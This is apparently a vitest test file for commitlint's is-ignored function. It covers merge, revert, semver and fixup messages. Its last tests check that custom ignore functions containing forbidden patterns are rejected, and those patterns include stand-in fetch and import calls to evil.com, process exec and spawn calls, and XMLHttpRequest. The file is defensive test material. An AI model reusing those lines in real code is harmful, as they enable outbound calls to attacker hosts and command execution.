import {test, expect} from 'vitest';

import isIgnored from './is-ignored.js';
import {Matcher} from '@commitlint/types';

const VERSION_MESSAGES = [
	'0.0.1',
	'0.1.0',
	'1.0.0',
	'0.0.1-alpha',
	'0.0.1-some-crazy-tag',
	'0.0.1-0',
	'0.0.1-999',
	'0.0.1-alpha.0',
	'0.0.1-alpha.999',
	'0.0.1-some-crazy-tag.0',
	'0.0.1-some-crazy-tag.999',
	'0.0.1-1e69d54',
	'v0.0.1',
	' v3.0.0',
];

const AMENDMENTS = [
	'Signed-off-by: Developer <example@example.com>',
	'Change-Id: I895114872a515a269487a683124b63303818e19c',
	'Signed-off-by: Developer <example@example.com>\nChange-Id: I895114872a515a269487a683124b63303818e19c',
];

const AMENDED_VERSION_MESSAGES = VERSION_MESSAGES.reduce<string[]>(
	(results, message) => {
		return [
			...results,
			...AMENDMENTS.map((amendment) => `${message}\n\n${amendment}`),
		];
	},
	[]
);

test('should return false when called without arguments', () => {
	expect(isIgnored()).toBe(false);
});

test('should return false when called with empty string', () => {
	expect(isIgnored('')).toBe(false);
});

test('should return false for normal commit', () => {
	expect(isIgnored('initial commit')).toBe(false);
});

test('should return true for branch merges', () => {
	expect(isIgnored("Merge branch 'iss53'")).toBe(true);
});

test('should return true for branch merges with newline characters', () => {
	expect(isIgnored("Merge branch 'ctrom-YarnBuild'\n")).toBe(true);
	expect(isIgnored("Merge branch 'ctrom-YarnBuild'\r\n")).toBe(true);
});

test('should return true for branch merges with multiple newline characters', () => {
	expect(isIgnored("Merge branch 'ctrom-YarnBuild'\n\n\n")).toBe(true);
	expect(isIgnored("Merge branch 'ctrom-YarnBuild'\r\n\r\n\r\n")).toBe(true);
});

test('should return true for merged PRs', () => {
	expect(isIgnored('Merge pull request #369')).toBe(true);
});

test('should return true for branch merges with newline characters and more characters after it', () => {
	expect(isIgnored("Merge branch 'ctrom-YarnBuild'\n ")).toBe(true);
	expect(isIgnored("Merge branch 'ctrom-YarnBuild'\r\n # some comment")).toBe(
		true
	);
});

test('should return true for tag merges', () => {
	expect(isIgnored("Merge tag '1.1.1'")).toBe(true);
	expect(isIgnored("Merge tag 'a tag'")).toBe(true);
});

test('should return true for tag merges with newline characters', () => {
	expect(isIgnored("Merge tag '1.1.1'\n")).toBe(true);
	expect(isIgnored("Merge tag '1.1.1'\r\n")).toBe(true);
});

test('should return true for tag merges with multiple newline characters', () => {
	expect(isIgnored("Merge tag '1.1.1'\n\n\n")).toBe(true);
	expect(isIgnored("Merge tag '1.1.1'\r\n\r\n\r\n")).toBe(true);
});

test('should return true for tag merges with newline characters and more characters after it', () => {
	expect(isIgnored("Merge tag '1.1.1'\n ")).toBe(true);
	expect(isIgnored("Merge tag '1.1.1'\r\n # some comment")).toBe(true);
});

test('should return true for revert commits', () => {
	expect(
		isIgnored(
			`Revert "docs: add recipe for linting of all commits in a PR (#36)"\n\nThis reverts commit 1e69d542c16c2a32acfd139e32efa07a45f19111.`
		)
	).toBe(true);
	expect(
		isIgnored(
			`revert "docs: add recipe for linting of all commits in a PR (#36)"\n\nThis reverts commit 1e69d542c16c2a32acfd139e32efa07a45f19111.`
		)
	).toBe(true);
});

test('should ignore npm semver commits', () => {
	VERSION_MESSAGES.forEach((message) => expect(isIgnored(message)).toBe(true));
});

test('should ignore npm semver commits with chore', () => {
	VERSION_MESSAGES.forEach((message) =>
		expect(isIgnored(`chore: ${message}`)).toBe(true)
	);
	VERSION_MESSAGES.forEach((message) =>
		expect(isIgnored(`chore(release): ${message}`)).toBe(true)
	);
});

test('should ignore npm semver commits with footers', () => {
	AMENDED_VERSION_MESSAGES.forEach((message) =>
		expect(isIgnored(message)).toBe(true)
	);
});

test('should return true amend commits', () => {
	expect(isIgnored('amend! initial commit')).toBe(true);
});

test('should return true fixup commits', () => {
	expect(isIgnored('fixup! initial commit')).toBe(true);
});

test('should return true squash commits', () => {
	expect(isIgnored('squash! initial commit')).toBe(true);
});

test('should return true for bitbucket merge commits', () => {
	expect(
		isIgnored('Merged in feature/facebook-friends-sync (pull request #8)')
	).toBe(true);
	expect(
		isIgnored('Merged develop into feature/component-form-select-card')
	).toBe(true);
	expect(isIgnored('Automatic merge')).toBe(true);
});

test('should return true for automatic merge commits', () => {
	expect(isIgnored('Auto-merged develop into master')).toBe(true);
	expect(isIgnored('Merge remote-tracking branch')).toBe(true);
});

test('should return true for azure devops merge commits', () => {
	expect(isIgnored('Merged PR 123: Description here')).toBe(true);
});

test('should return false for commits containing, but not starting, with merge branch', () => {
	expect(isIgnored('foo bar Merge branch xxx')).toBe(false);
});

test('should return false for commits containing, but not starting, with merge tag', () => {
	expect(isIgnored("foo bar Merge tag '1.1.1'")).toBe(false);
});

test('should return false for ignored message if defaults is false', () => {
	expect(
		isIgnored('Auto-merged develop into master', {
			defaults: false,
		})
	).toBe(false);
});

test('should return false for ignored message if custom ignores and defaults is false', () => {
	expect(
		isIgnored('Auto-merged develop into master', {
			defaults: false,
		})
	).toBe(false);
});

test('should throw error if ignores is not an array', () => {
	const ignoredString = 'this should be ignored';
	expect(() => {
		isIgnored(ignoredString, {
			ignores: 'throws error',
		} as any);
	}).toThrow('ignores must be of type array, received ');
});

test('should return true for custom ignores as function', () => {
	const ignoredString = 'this should be ignored';
	expect(
		isIgnored(ignoredString, {
			ignores: [(c) => c === ignoredString],
		})
	).toBe(true);
});

test('should throw error if any element of ignores is not a function', () => {
	const ignoredString = 'this should be ignored';
	expect(() => {
		isIgnored(ignoredString, {
			ignores: ['throws error'],
		} as any);
	}).toThrow('ignores must be array of type function, received items of type:');
});

test('should throw error if custom ignore function returns non-boolean value', () => {
	const testCases = [
		() => 1, // number
		() => 'true', // string
		() => undefined, // undefined
		() => null, // null
		() => ({}), // object
		() => [], // array
	];

	testCases.forEach((testFn) => {
		expect(() => {
			isIgnored('some commit', {
				ignores: [testFn as unknown as Matcher],
			});
		}).toThrow('Ignore function must return a boolean');
	});
});

test('should throw error for custom ignore functions with security risks', () => {
	const maliciousPatterns = [
		'function() { fetch("https://evil.com"); return true; }',
		'function() { import("https://evil.com"); return true; }',
		'function() { require("fs"); return true; }',
		'function() { process.exec("ls"); return true; }',
		'function() { process.spawn("ls"); return true; }',
		'function() { process.execFile("ls"); return true; }',
		'function() { process.execSync("ls"); return true; }',
		'function() { new XMLHttpRequest(); return true; }',
	];

	maliciousPatterns.forEach((fnString) => {
		const fn = new Function(`return ${fnString}`)();
		expect(() => {
			isIgnored('some commit', {
				ignores: [fn],
			});
		}).toThrow('Ignore function contains forbidden pattern');
	});
});

test('should not throw error for custom ignore functions without security risks', () => {
	const safePatterns = [
		'function(commit) { return commit === "some commit"; }',
		'function(commit) { return commit.startsWith("some"); }',
		'function(commit) { return commit.includes("some"); }',
		'function(commit) { return commit.length < 10 && commit.includes("some"); }',
		'function(commit) { return commit.length < 10 || commit.includes("fetch"); }',
		'function(commit) { return commit.includes("exec"); }',
	];

	safePatterns.forEach((fnString) => {
		const fn = new Function(`return ${fnString}`)();
		expect(() => {
			isIgnored('some commit', {
				ignores: [fn],
			});
		}).not.toThrow();
	});
});
